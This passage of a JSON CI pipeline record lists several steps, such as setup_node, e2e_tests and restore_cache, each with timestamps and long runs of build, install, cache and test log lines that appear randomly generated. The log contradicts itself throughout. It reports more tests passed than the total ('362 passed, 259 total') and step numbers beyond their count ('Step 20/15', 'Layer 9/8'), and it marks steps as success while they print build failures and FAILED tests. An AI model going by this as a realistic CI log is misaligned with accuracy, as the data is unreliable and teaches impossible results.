          "Artifact downloaded: 46MB",
          "Cache invalidated: build",
          "Generating source maps...",
          "TLS handshake completed",
          "Platform: darwin-arm64",
          "[12:20:08] ERROR: Connection failed",
          "Building Docker image...",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=test",
          "[12:20:08] INFO: Processing request",
          "OK",
          "pip: Downloading lodash-3.19.tar.gz",
          "Bundling main.css",
          "[12:20:08] INFO: Starting build process",
          "Checking out master branch",
          "Pushing to registry...",
          "Loading...",
          "POST /upload - 200 (198ms)",
          "Environment: development",
          "Pulling image: alpine:3.11",
          "Pushing to registry...",
          "Step 2/20: Running migrations",
          "Pushing to registry...",
          "Creating production build...",
          "Success!",
          "  PASS: test_api_health (336ms)",
          "Coverage: 85% statements, 65% branches",
          "Image pulled successfully",
          "Generating source maps...",
          "Cache hit for key-8045",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "pip: Collecting webpack",
          "\u2713 Task completed in 286ms",
          "[12:20:08] DEBUG: Query executed in 31ms",
          "[12:20:08] INFO: Cache refreshed",
          "Environment: development",
          "Transforming 458 files...",
          "npm install: added 238 packages",
          "\u2713 build completed",
          "\u2713 Step 'install' succeeded",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:08] WARN: Deprecated API usage",
          "Installing eslint@4.11.7",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /api - 202 (207ms)",
          "Using Python 3.11",
          "Step 6/21: Deploying",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-9162",
          "Completed.",
          "Switched to branch 'feature/task-621'",
          "Compiling src/index.js...",
          "[12:20:08] INFO: Request completed",
          "[12:20:08] INFO: Starting build process",
          "Completed.",
          "Uploading artifact 'coverage' (50 files)",
          "Finished.",
          "Pushing to registry...",
          "Cache invalidated: build",
          "Platform: linux-x64",
          "[12:20:08] INFO: Cache refreshed",
          "Ready.",
          "Artifact uploaded: dist.zip (69MB)",
          "Cache invalidated: node_modules",
          "Compiling lib/utils.go...",
          "Compiling src/utils.go...",
          "npm notice: package.json updated",
          "[12:20:08] DEBUG: Memory usage: 352MB",
          "Test Suites: 41 passed, 35 total",
          "yarn add: Done in 27.20s",
          "NODE_ENV=production",
          "Pushing to registry...",
          "npm install: added 207 packages",
          "GET /api - 200 (12ms)",
          "HEAD is now at 7545621",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting prettier",
          "OK",
          "[12:20:08] INFO: Cache refreshed",
          "pip install: Successfully installed eslint-3.2",
          "Tests: 362 passed, 259 total",
          "Connection established",
          "[12:20:08] DEBUG: Query executed in 89ms",
          "Artifact downloaded: 18MB",
          "Artifact uploaded: build.tar.gz (30MB)",
          "NODE_ENV=production",
          "Uploading artifact 'build' (47 files)",
          "HEAD is now at 293838d",
          "TLS handshake completed",
          "Success!",
          "Step 11/16: Installing dependencies",
          "Artifact downloaded: 21MB",
          "Layer 4/14: ENV command",
          "Cache hit for key-7770",
          "Platform: darwin-arm64",
          "Step 19/25: Installing dependencies",
          "pip: Collecting lodash",
          "Loading...",
          "Environment: production",
          "Compiling src/main.py...",
          "Environment: production",
          "Image pulled successfully",
          "Layer 3/12: COPY command",
          "[12:20:08] WARN: Deprecated API usage",
          "Tests: 207 passed, 407 total",
          "Optimizing 60 modules...",
          "npm notice: package.json updated",
          "Time: 81.437s",
          "  PASS: integration/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (38MB)",
          "npm install: resolved 909 packages",
          "Bundling runtime.js",
          "\u2713 Task completed in 2978ms",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache restored successfully (388MB)",
          "Compiling components/app.ts...",
          "\u2713 All checks passed",
          "Pulling image: python:3.11",
          "Pushing to registry...",
          "[12:20:08] WARN: Deprecated API usage",
          "Verifying...",
          "Generating source maps...",
          "Connecting to cloud.services:443...",
          "Compiling utils/service.java...",
          "npm install: added 367 packages",
          "[12:20:08] ERROR: Connection failed",
          "Exception: TypeError",
          "\u2717 build failed with exit code 56",
          "[12:20:08] INFO: Processing request",
          "Finished.",
          "[12:20:08] INFO: Connecting to database",
          "Image pulled successfully",
          "Optimizing 80 modules...",
          "[12:20:08] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:20:08] WARN: Deprecated API usage",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: dependencies",
          "Connection established",
          "FAILED: test_auth_login",
          "Switched to branch 'bugfix/task-128'",
          "[12:20:08] INFO: Cache refreshed",
          "[12:20:08] INFO: Starting build process",
          "yarn add: Done in 28.22s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/index.js...",
          "GET /status - 200 (36ms)",
          "GET /status - 201 (49ms)",
          "Done.",
          "OK",
          "[12:20:08] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Using Python 3.11",
          "Optimizing 50 modules...",
          "Artifact uploaded: dist.zip (47MB)",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (88MB)",
          "[12:20:08] INFO: Request completed",
          "Step 10/23: Installing dependencies",
          "Connecting to cloud.services:443...",
          "[12:20:08] ERROR: Connection failed",
          "Installing lodash@1.17.3",
          "Verifying...",
          "Cache restored successfully (273MB)",
          "Cache restored successfully (107MB)",
          "HEAD is now at d3a210a",
          "Checking out master branch",
          "NODE_ENV=test",
          "Switched to branch 'feature/task-881'",
          "yarn add: Done in 4.29s",
          "Time: 63.723s",
          "[12:20:08] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "[12:20:08] INFO: Starting build process",
          "Creating production build...",
          "Success!",
          "Step 14/16: Linting",
          "Uploading artifact 'dist' (4 files)",
          "\u2713 Step 'test' succeeded",
          "\u2713 deploy completed",
          "Done.",
          "[12:20:08] DEBUG: Memory usage: 764MB",
          "Minifying main.js",
          "Pushing to registry...",
          "Ready.",
          "Completed.",
          "Environment: development",
          "Connection established",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-23T12:20:31.146619",
        "finished_at": "2025-11-23T12:20:40.544738",
        "log_lines": [
          "=== Step: setup_node ===",
          "Building Docker image...",
          "Cache miss for key-4526",
          "[12:20:08] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.11",
          "[12:20:08] DEBUG: Loading configuration",
          "[12:20:08] DEBUG: Query executed in 86ms",
          "Compiling lib/utils.go...",
          "Time: 16.510s",
          "Ran 104 tests in 7s",
          "Ran 79 tests in 12s",
          "Verifying...",
          "\u2713 Task completed in 4009ms",
          "\u2717 build failed with exit code 124",
          "Installing prettier@4.20.6",
          "npm install: added 164 packages",
          "\u2713 test completed",
          "[12:20:08] ERROR: Connection failed",
          "  PASS: test_auth_login (356ms)",
          "[12:20:08] DEBUG: Connection pool: 20 active",
          "Artifact downloaded: 46MB",
          "Image pulled successfully",
          "Loading...",
          "OK",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/15: Building",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "Ready.",
          "pip: Installing build dependencies...",
          "FAILED: test_db_connect",
          "Creating production build...",
          "Compiling lib/app.ts...",
          "Using Node.js 17.7.2",
          "Pushing to registry...",
          "Compiling utils/handler.rs...",
          "Uploading artifact 'dist' (26 files)",
          "Connection established",
          "Artifact downloaded: 2MB",
          "npm install: added 279 packages",
          "Platform: linux-x64",
          "Environment: development",
          "npm notice: package.json updated",
          "pip: Collecting prettier",
          "Exception: TypeError",
          "Installing express@4.5.0",
          "Time: 116.978s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 202 packages",
          "pip: Installing build dependencies...",
          "  PASS: test_auth_login (107ms)",
          "npm install: added 21 packages",
          "Already up to date.",
          "Platform: linux-x64",
          "[12:20:08] DEBUG: Initializing service",
          "OK",
          "[12:20:08] DEBUG: Memory usage: 1243MB",
          "pip install: Successfully installed lodash-5.6",
          "FAILED: test_db_connect",
          "[12:20:08] WARN: Deprecated API usage",
          "Loading...",
          "npm install: added 179 packages",
          "Test Suites: 31 passed, 27 total",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Cache saved successfully",
          "Processing...",
          "[12:20:08] INFO: Request completed",
          "Checking out master branch",
          "Artifact downloaded: 40MB",
          "Uploading artifact 'dist' (48 files)",
          "Test Suites: 48 passed, 46 total",
          "Compiling src/app.ts...",
          "HEAD is now at 3bd8543",
          "Step 13/24: Testing",
          "Step 20/15: Running migrations",
          "  PASS: unit/test_user_create.spec.js",
          "[12:20:08] INFO: Processing request",
          "Optimizing 46 modules...",
          "Layer 9/8: COPY command",
          "POST /upload - 200 (310ms)",
          "Cache hit for key-9749",
          "Environment: test",
          "pip: Downloading webpack-2.10.tar.gz",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_auth_login (101ms)",
          "Waiting...",
          "Loading...",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Generating source maps...",
          "Optimizing 70 modules...",
          "Tests: 362 passed, 355 total",
          "POST /upload - 202 (90ms)",
          "Pulling image: node:3.11",
          "Using Node.js 18.15.2",
          "Processing...",
          "Cache saved successfully",
          "Compiling src/index.js...",
          "Step 12/20: Testing",
          "Step 3/15: Running migrations",
          "Minifying vendor.js",
          "Artifact downloaded: 3MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/handler.rs...",
          "Success!",
          "\u2713 build completed",
          "[12:20:08] DEBUG: Query executed in 30ms",
          "Step 12/23: Linting",
          "Compiling components/utils.go...",
          "Checking out develop branch",
          "Cache miss for key-4288",
          "Verifying...",
          "Loading...",
          "HEAD is now at c1c0201",
          "Artifact uploaded: dist.zip (5MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_cache_hit (255ms)",
          "[12:20:08] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (50 files)",
          "Ready.",
          "Coverage: 71% statements, 62% branches",
          "npm notice: created a lockfile",
          "Processing...",
          "npm install: resolved 1928 packages",
          "Waiting...",
          "[12:20:08] INFO: Connecting to database",
          "Pushing to registry...",
          "Building Docker image...",
          "Compiling src/index.js...",
          "Finished.",
          "[12:20:08] DEBUG: Memory usage: 1541MB",
          "Step 15/20: Running migrations",
          "FAILED: test_auth_login",
          "Time: 66.43s",
          "Already up to date.",
          "NODE_ENV=test",
          "Done.",
          "[12:20:08] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "Step 12/15: Running migrations",
          "Finished.",
          "Cache invalidated: build",
          "Loading...",
          "[12:20:08] DEBUG: Memory usage: 567MB",
          "POST /data - 201 (330ms)",
          "pip install: Successfully installed react-5.1",
          "Verifying...",
          "NODE_ENV=test",
          "Finished.",
          "Success!",
          "\u2713 Task completed in 1751ms",
          "Image pulled successfully",
          "Step 10/23: Building",
          "Snapshots: 49 passed, 28 total",
          "Verifying...",
          "[12:20:08] DEBUG: Query executed in 99ms",
          "Cache saved successfully",
          "Tests: 89 passed, 231 total",
          "[12:20:08] DEBUG: Loading configuration",
          "Processing...",
          "Cache saved successfully",
          "  PASS: e2e/test_db_connect.spec.js",
          "Optimizing 92 modules...",
          "Installing eslint@1.19.0",
          "Verifying...",
          "npm notice: package.json updated",
          "\u2713 Task completed in 2897ms",
          "[12:20:08] INFO: Request completed",
          "[12:20:08] DEBUG: Initializing service",
          "Success!",
          "Verifying...",
          "Layer 5/12: RUN command",
          "npm install: added 303 packages",
          "[12:20:08] INFO: Request completed",
          "pip: Installing build dependencies...",
          "WARNING: prettier has known vulnerabilities",
          "Uploading artifact 'coverage' (7 files)",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Cache miss for key-2360",
          "Exception: TypeError",
          "Image pulled successfully",
          "pip install: Successfully installed prettier-5.4",
          "Generating source maps...",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Step 5/17: Linting",
          "Cache hit for key-8648",
          "[12:20:08] INFO: Connecting to database",
          "\u2713 All checks passed",
          "\u2713 validate completed",
          "OK",
          "Using Node.js 14.6.2",
          "pip: Downloading react-2.5.tar.gz",
          "npm notice: package.json updated",
          "Step 17/16: Building",
          "Step 10/20: Running migrations",
          "Pulling image: alpine:18",
          "pip: Collecting axios",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-23T12:20:40.544738",
        "finished_at": "2025-11-23T12:20:49.942857",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Switched to branch 'bugfix/task-839'",
          "Optimizing 46 modules...",
          "Artifact uploaded: dist.zip (98MB)",
          "npm install: added 346 packages",
          "Building Docker image...",
          "Bundling main.js",
          "[12:20:08] DEBUG: Query executed in 72ms",
          "FAILED: test_db_connect",
          "npm install: resolved 365 packages",
          "Layer 8/10: COPY command",
          "Pulling image: node:3.11",
          "Tests: 337 passed, 195 total",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/index.js...",
          "Processing...",
          "\u2713 All checks passed",
          "[12:20:08] INFO: Cache refreshed",
          "Processing...",
          "yarn add: Done in 13.51s",
          "WARNING: eslint has known vulnerabilities",
          "[12:20:08] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /status - 200 (20ms)",
          "npm install: resolved 397 packages",
          "pip: Collecting eslint",
          "Environment: development",
          "Pushing to registry...",
          "Step 15/19: Linting",
          "Cache invalidated: build",
          "Uploading artifact 'build' (7 files)",
          "Ready.",
          "Pulling image: node:3.11",
          "Ready.",
          "Transforming 828 files...",
          "[12:20:08] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (83MB)",
          "Coverage: 88% statements, 94% branches",
          "Layer 6/13: RUN command",
          "Pushing to registry...",
          "Ran 33 tests in 13s",
          "pip: Collecting lodash",
          "pip: Collecting webpack",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed axios-5.2",
          "Installing axios@2.15.8",
          "\u2713 Step 'test' succeeded",
          "Already up to date.",
          "Waiting...",
          "Cache hit for key-7854",
          "Time: 99.374s",
          "Switched to branch 'feature/task-667'",
          "Uploading artifact 'build' (7 files)",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:08] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling lib/service.java...",
          "Step 19/22: Linting",
          "\u2713 All checks passed",
          "Installing axios@5.1.1",
          "Step 6/23: Building",
          "Step 3/25: Testing",
          "[12:20:08] INFO: Connecting to database",
          "Coverage: 97% statements, 97% branches",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed react-1.4",
          "Compiling lib/app.ts...",
          "Using Node.js 14.4.3",
          "Uploading artifact 'dist' (29 files)",
          "\u2713 All checks passed",
          "Using Python 3.9",
          "Ready.",
          "pip: Downloading react-4.19.tar.gz",
          "  PASS: e2e/test_cache_hit.spec.js",
          "OK",
          "Cache invalidated: dependencies",
          "Optimizing 18 modules...",
          "Completed.",
          "[12:20:08] DEBUG: Memory usage: 1177MB",
          "Bundling styles.js",
          "Step 13/21: Building",
          "npm notice: package.json updated",
          "Tests: 130 passed, 191 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:08] ERROR: Connection failed",
          "Step 13/21: Building",
          "Bundling main.css",
          "HEAD is now at de2e4fb",
          "Ran 151 tests in 45s",
          "Pulling image: python:3.11",
          "Done.",
          "[12:20:08] INFO: Starting build process",
          "Pulling image: alpine:latest",
          "Step 14/21: Deploying",
          "Optimizing 24 modules...",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] DEBUG: Initializing service",
          "Pulling image: alpine:3.11",
          "HEAD is now at af1ea62",
          "Artifact uploaded: build.tar.gz (28MB)",
          "WARNING: express has known vulnerabilities",
          "Waiting...",
          "Minifying vendor.js",
          "Using Python 3.12",
          "Compiling utils/index.js...",
          "Connection established",
          "npm install: added 125 packages",
          "[12:20:08] DEBUG: Query executed in 80ms",
          "\u2713 deploy completed",
          "Step 17/15: Building",
          "Ready.",
          "yarn add: Done in 29.35s",
          "Cache miss for key-3058",
          "Building Docker image...",
          "\u2713 Task completed in 870ms",
          "Creating production build...",
          "[12:20:08] DEBUG: Memory usage: 1634MB",
          "Environment: development",
          "yarn add: Done in 1.55s",
          "GET /status - 201 (68ms)",
          "Cache saved successfully",
          "Snapshots: 27 passed, 47 total",
          "Checking out main branch",
          "Minifying vendor.js",
          "Optimizing 38 modules...",
          "Step 16/16: Linting",
          "GET /health - 200 (10ms)",
          "Pushing to registry...",
          "[12:20:08] INFO: Connecting to database",
          "[12:20:08] INFO: Starting build process",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Switched to branch 'feature/task-896'",
          "Cache hit for key-3607",
          "[12:20:08] DEBUG: Initializing service",
          "WARNING: jest has known vulnerabilities",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:20:08] INFO: Request completed",
          "Artifact uploaded: dist.zip (15MB)",
          "pip: Installing build dependencies...",
          "Coverage: 83% statements, 80% branches",
          "Verifying...",
          "[12:20:08] INFO: Processing request",
          "Step 5/21: Testing",
          "  PASS: test_auth_login (430ms)",
          "Step 11/25: Linting",
          "Using Python 3.9",
          "yarn add: Done in 16.83s",
          "Test Suites: 35 passed, 14 total",
          "Using Python 3.12",
          "[12:20:08] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Completed.",
          "[12:20:08] INFO: Request completed",
          "Creating production build...",
          "FAILED: test_user_create",
          "Step 12/23: Deploying",
          "Finished.",
          "Artifact uploaded: dist.zip (64MB)",
          "Step 7/18: Testing",
          "Finished.",
          "OK",
          "TLS handshake completed",
          "Done.",
          "[12:20:08] INFO: Cache refreshed",
          "Ready.",
          "  PASS: test_auth_login (365ms)",
          "Step 14/22: Testing",
          "Verifying...",
          "Cache hit for key-7511",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] INFO: Cache refreshed",
          "Cache restored successfully (278MB)",
          "Transforming 604 files...",
          "Artifact uploaded: dist.zip (67MB)",
          "Platform: linux-x64",
          "pip install: Successfully installed express-2.19",
          "Fetching submodules...",
          "Tests: 129 passed, 163 total",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/utils.go...",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Loading...",
          "Step 5/23: Linting",
          "Checking out main branch",
          "Tests: 99 passed, 135 total",
          "Fetching submodules...",
          "Connection established",
          "FAILED: test_cache_hit",
          "Compiling src/index.js...",
          "Optimizing 45 modules...",
          "\u2713 deploy completed",
          "Test Suites: 40 passed, 48 total",
          "Processing...",
          "Cache invalidated: node_modules",
          "Platform: darwin-arm64",
          "Step 10/23: Testing",
          "Time: 53.7s",
          "\u2717 build failed with exit code 9",
          "Pushing to registry...",
          "pip: Downloading lodash-3.19.tar.gz",
          "Step 10/19: Building",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-23T12:20:49.942857",
        "finished_at": "2025-11-23T12:20:55.581728",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Processing...",
          "HEAD is now at 80b81da",
          "npm install: resolved 270 packages",
          "yarn add: Done in 9.5s",
          "yarn add: Done in 4.93s",
          "\u2713 All checks passed",
          "Step 5/15: Building",
          "HEAD is now at 16f4667",
          "Pushing to registry...",
          "Waiting...",
          "OK",
          "Fetching submodules...",
          "Cache hit for key-6451",
          "Step 9/20: Building",
          "pip: Installing build dependencies...",
          "Installing express@5.11.0",
          "pip: Downloading prettier-4.17.tar.gz",
          "Checking out master branch",
          "Step 19/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 deploy completed",
          "TLS handshake completed",
          "HEAD is now at 7a86e3d",
          "Coverage: 75% statements, 99% branches",
          "GET /status - 204 (39ms)",
          "yarn add: Done in 2.51s",
          "  PASS: e2e/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (6MB)",
          "npm notice: package.json updated",
          "Optimizing 87 modules...",
          "pip: Installing build dependencies...",
          "Optimizing 31 modules...",
          "pip: Installing build dependencies...",
          "Processing...",
          "\u2713 Task completed in 122ms",
          "Building Docker image...",
          "pip: Downloading react-3.19.tar.gz",
          "Checking out develop branch",
          "[12:20:08] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "pip: Collecting jest",
          "Tests: 260 passed, 263 total",
          "Compiling components/main.py...",
          "Step 17/23: Building",
          "Artifact downloaded: 2MB",
          "npm install: added 259 packages",
          "Verifying...",
          "Verifying...",
          "Done.",
          "pip install: Successfully installed express-4.2",
          "  PASS: test_cache_hit (367ms)",
          "pip: Downloading webpack-2.13.tar.gz",
          "Tests: 81 passed, 63 total",
          "Cache invalidated: node_modules",
          "Step 6/24: Building",
          "Step 18/15: Running migrations",
          "Artifact downloaded: 9MB",
          "Cache hit for key-3611",
          "WARNING: axios has known vulnerabilities",
          "[12:20:08] DEBUG: Memory usage: 1287MB",
          "yarn add: Done in 12.87s",
          "Step 9/24: Installing dependencies",
          "Compiling lib/service.java...",
          "  PASS: integration/test_user_create.spec.js",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:08] DEBUG: Query executed in 47ms",
          "Bundling main.js",
          "Using Node.js 16.20.2",
          "Fetching submodules...",
          "Completed.",
          "Image pulled successfully",
          "npm install: resolved 461 packages",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (76MB)",
          "Success!",
          "Step 13/23: Linting",
          "WARNING: jest has known vulnerabilities",
          "Completed.",
          "npm notice: package.json updated",
          "Cache restored successfully (349MB)",
          "  PASS: integration/test_db_connect.spec.js",
          "pip: Downloading axios-2.18.tar.gz",
          "Compiling components/index.js...",
          "pip: Collecting eslint",
          "Transforming 910 files...",
          "pip: Collecting prettier",
          "Artifact uploaded: dist.zip (12MB)",
          "Tests: 75 passed, 288 total",
          "[12:20:08] INFO: Request completed",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: python:3.11",
          "Loading...",
          "Transforming 119 files...",
          "Image pulled successfully",
          "[12:20:08] DEBUG: Query executed in 94ms",
          "Cache restored successfully (365MB)",
          "Tests: 396 passed, 103 total",
          "Already up to date.",
          "Switched to branch 'bugfix/task-308'",
          "Pulling image: python:3.11",
          "Completed.",
          "yarn add: Done in 12.36s",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Layer 8/13: ENV command",
          "pip: Installing build dependencies...",
          "[12:20:08] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "\u2713 Task completed in 1491ms",
          "\u2713 validate completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:20:08] INFO: Request completed",
          "Cache miss for key-8069",
          "Time: 58.290s",
          "OK",
          "Switched to branch 'bugfix/task-185'",
          "Tests: 393 passed, 184 total",
          "Verifying...",
          "Step 1/20: Testing",
          "[12:20:08] INFO: Processing request",
          "NODE_ENV=test",
          "Exception: TypeError",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:08] DEBUG: Connection pool: 7 active",
          "Finished.",
          "Artifact downloaded: 23MB",
          "yarn add: Done in 23.65s",
          "[12:20:08] INFO: Request completed",
          "Platform: darwin-arm64",
          "[12:20:08] DEBUG: Loading configuration",
          "\u2713 lint completed",
          "HEAD is now at c4fc053",
          "[12:20:08] WARN: Deprecated API usage",
          "Cache hit for key-6366",
          "Step 10/24: Building",
          "Step 3/25: Building",
          "pip: Collecting react",
          "Using Python 3.11",
          "[12:20:08] INFO: Request completed",
          "npm install: added 34 packages",
          "\u2713 All checks passed",
          "Optimizing 99 modules...",
          "Processing...",
          "\u2717 build failed with exit code 26",
          "[12:20:08] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (3 files)",
          "Pulling image: node:latest",
          "[12:20:08] DEBUG: Loading configuration",
          "POST /data - 201 (305ms)",
          "pip install: Successfully installed react-5.4",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "Pulling image: node:3.11",
          "Step 9/24: Building",
          "Building Docker image...",
          "Compiling components/service.java...",
          "\u2713 Step 'test' succeeded",
          "Time: 41.934s",
          "[12:20:08] INFO: Cache refreshed",
          "Cache miss for key-7356",
          "Step 16/20: Linting",
          "POST /upload - 201 (464ms)",
          "Processing...",
          "TLS handshake completed",
          "Step 10/15: Deploying",
          "Step 1/24: Deploying",
          "Cache restored successfully (448MB)",
          "[12:20:08] INFO: Processing request",
          "\u2713 All checks passed",
          "Step 20/17: Deploying",
          "Step 19/21: Installing dependencies",
          "\u2713 package completed",
          "npm notice: created a lockfile",
          "Installing jest@3.20.4",
          "Loading...",
          "Step 19/18: Deploying",
          "Finished.",
          "WARNING: axios has known vulnerabilities",
          "[12:20:08] DEBUG: Memory usage: 1929MB",
          "Step 18/15: Building",
          "Cache invalidated: build",
          "Compiling utils/handler.rs...",
          "Processing...",
          "Uploading artifact 'coverage' (17 files)",
          "Loading...",
          "Completed.",
          "Coverage: 87% statements, 85% branches",
          "Step 3/20: Installing dependencies",
          "HEAD is now at f561b6a",
          "OK",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "[12:20:08] DEBUG: Query executed in 91ms",
          "WARNING: express has known vulnerabilities",
          "yarn add: Done in 29.15s",
          "Cache hit for key-7181",
          "Step 7/18: Deploying",
          "\u2713 All checks passed",
          "Snapshots: 2 passed, 49 total",
          "GET /api - 204 (72ms)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-23T12:20:55.581728",
        "finished_at": "2025-11-23T12:21:23.776085",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Generating source maps...",
          "Creating production build...",
          "Compiling lib/app.ts...",
          "Compiling utils/app.ts...",
          "Bundling runtime.js",
          "Compiling components/main.py...",
          "Test Suites: 33 passed, 34 total",
          "Using Python 3.9",
          "Image pulled successfully",
          "[12:20:08] INFO: Processing request",
          "\u2713 Task completed in 3280ms",
          "Step 17/16: Linting",
          "Step 2/24: Installing dependencies",
          "Step 10/16: Running migrations",
          "Optimizing 16 modules...",
          "Bundling main.css",
          "Compiling lib/handler.rs...",
          "FAILED: test_api_health",
          "Loading...",
          "Generating source maps...",
          "Step 6/18: Installing dependencies",
          "[12:20:08] INFO: Connecting to database",
          "Using Python 3.12",
          "Finished.",
          "npm notice: package.json updated",
          "[12:20:08] DEBUG: Query executed in 90ms",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: dependencies",
          "[12:20:08] DEBUG: Connection pool: 6 active",
          "Connecting to cloud.services:443...",
          "Step 2/20: Testing",
          "Compiling components/handler.rs...",
          "Transforming 462 files...",
          "Already up to date.",
          "Installing webpack@1.10.4",
          "Cache hit for key-6132",
          "Checking out main branch",
          "Compiling src/main.py...",
          "Success!",
          "Time: 15.263s",
          "WARNING: react has known vulnerabilities",
          "[12:20:08] WARN: Deprecated API usage",
          "Completed.",
          "Transforming 848 files...",
          "npm notice: package.json updated",
          "POST /data - 202 (416ms)",
          "Done.",
          "Artifact downloaded: 46MB",
          "Step 19/15: Testing",
          "POST /api - 202 (367ms)",
          "[12:20:08] INFO: Request completed",
          "Time: 104.747s",
          "pip: Downloading eslint-1.1.tar.gz",
          "Step 11/15: Testing",
          "OK",
          "Coverage: 84% statements, 73% branches",
          "Fetching submodules...",
          "[12:20:08] DEBUG: Loading configuration",
          "Success!",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at 5e911b5",
          "npm install: added 299 packages",
          "Environment: staging",
          "TLS handshake completed",
          "Checking out develop branch",
          "[12:20:08] DEBUG: Query executed in 12ms",
          "[12:20:08] INFO: Starting build process",
          "Success!",
          "Using Node.js 20.20.10",
          "Completed.",
          "Step 8/24: Building",
          "[12:20:08] DEBUG: Initializing service",
          "\u2713 Task completed in 4847ms",
          "Cache invalidated: node_modules",
          "pip: Installing build dependencies...",
          "npm install: resolved 1139 packages",
          "Platform: darwin-arm64",
          "Creating production build...",
          "Snapshots: 23 passed, 44 total",
          "FAILED: test_api_health",
          "WARNING: react has known vulnerabilities",
          "Generating source maps...",
          "WARNING: lodash has known vulnerabilities",
          "npm install: resolved 1371 packages",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Loading...",
          "POST /data - 200 (22ms)",
          "Step 8/24: Testing",
          "HEAD is now at 9eea3bb",
          "  PASS: test_cache_hit (263ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Ran 166 tests in 9s",
          "Pulling image: alpine:18",
          "Cache miss for key-6050",
          "\u2713 All checks passed",
          "[12:20:08] DEBUG: Initializing service",
          "Connecting to acme.corp:443...",
          "Cache invalidated: build",
          "GET /health - 204 (46ms)",
          "Cache invalidated: node_modules",
          "Done.",
          "Loading...",
          "Coverage: 83% statements, 97% branches",
          "Building Docker image...",
          "Transforming 138 files...",
          "\u2713 Task completed in 3215ms",
          "Ready.",
          "[12:20:08] DEBUG: Memory usage: 266MB",
          "Cache miss for key-2247",
          "  PASS: unit/test_api_health.spec.js",
          "POST /upload - 202 (363ms)",
          "Waiting...",
          "Uploading artifact 'build' (14 files)",
          "\u2713 Step 'install' succeeded",
          "Creating production build...",
          "TLS handshake completed",
          "pip: Collecting jest",
